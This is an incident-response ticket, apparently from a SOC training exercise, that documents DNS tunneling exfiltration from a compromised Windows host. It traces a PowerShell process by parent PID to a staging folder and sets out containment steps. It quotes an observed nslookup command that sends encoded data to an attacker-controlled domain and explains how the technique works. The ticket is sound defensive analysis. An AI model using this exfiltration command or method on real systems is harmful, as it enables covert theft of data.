INCIDENT TICKET: Data Exfiltration via DNS (DNS Tunneling)

Date: February 18, 2026
Host: win-3450
Analyst: Alperen Metin
Verdict: True Positive – Escalated to Tier 3 / Incident Response

Overview


![DNS Exfiltration Log](Images/5-splunk-log.png)


After the suspicious network share mapping and subsequent cleanup activity on host win-3450, monitoring activity showed a new and more critical behavior.

The same PowerShell process previously involved in the attack chain began executing nslookup.exe with unusually long and encoded-looking subdomains. This behavior is consistent with DNS tunneling used for data exfiltration.

Based on process correlation and command-line evidence, this activity is a continuation of the earlier compromise.

Technical Details
Process Correlation

The malicious activity is still tied to:

Parent Process: powershell.exe

PID: 3728

This is the same PowerShell process that:

Mapped the financial records network share

Deleted the share shortly after

Continued execution from the user’s Downloads directory

This confirms a single continuous attack chain rather than isolated alerts.

Staging Location

The working directory changed to:

C:\Users\michael.ascot\downloads\exfiltration\

This strongly suggests that the attacker staged collected data in a dedicated folder before beginning exfiltration.

The folder name itself (“exfiltration”) is highly suspicious and not consistent with normal user behavior.

DNS Exfiltration Command

The following command was observed:

"C:\Windows\system32\nslookup.exe" UEsDBBQAAAAIANigLlfVU3cDIgAAAI.haz4rdw4re.io

Key observations:

nslookup.exe is a legitimate Windows tool used for DNS queries.

The subdomain contains a long encoded-looking string (UEsDBBQAAAAI...).

The query was sent to haz4rdw4re.io, which is not a known business-related domain.

This matches a common DNS tunneling technique where:

Data is encoded (often Base64).

The encoded data is inserted into the subdomain field.

The internal DNS server forwards the query externally.

The attacker-controlled nameserver receives the data.

Because DNS traffic is typically allowed outbound, this method can bypass traditional firewall controls.

Impact Assessment

Severity: Critical

Risk Level: High

Data Exposure: Likely financial records from SSF-FinancialRecords share

The string UEsDBBQ... is likely part of an encoded data chunk being exfiltrated.

At this stage, data loss is either in progress or has already occurred.

Actions Taken

Confirmed that host win-3450 was fully isolated from the network.

Added haz4rdw4re.io to the enterprise DNS blocklist/sinkhole to prevent further outbound communication.

Linked this activity to previous alerts using Parent PID correlation.

Escalated the incident to Tier 3 / Incident Response.

Updated the incident severity to CRITICAL.

Analyst Notes

This case clearly shows how an attack can evolve step by step:

Initial access / execution

Access to sensitive file share

Cleanup of mapped drive

Staging of data

DNS-based exfiltration

The most important indicator in this investigation was the consistent Parent PID (3728). Tracking the process chain allowed reconstruction of the full attack lifecycle.